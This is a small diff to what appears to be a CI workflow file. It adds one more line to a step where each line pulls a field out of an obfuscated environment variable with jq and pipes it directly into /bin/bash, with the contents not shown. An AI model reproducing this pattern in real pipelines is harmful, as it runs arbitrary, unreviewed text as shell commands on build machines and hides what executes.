@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$ov466" | jq -r .x022 | /bin/bash
           echo $uofvu2409 | jq -r .zdxt55 | /bin/bash
           printf '%s' "$zut5" | jq -r .nly663 | /bin/bash
+          printf '%s' "$pxfei3" | jq -r .vsos970 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
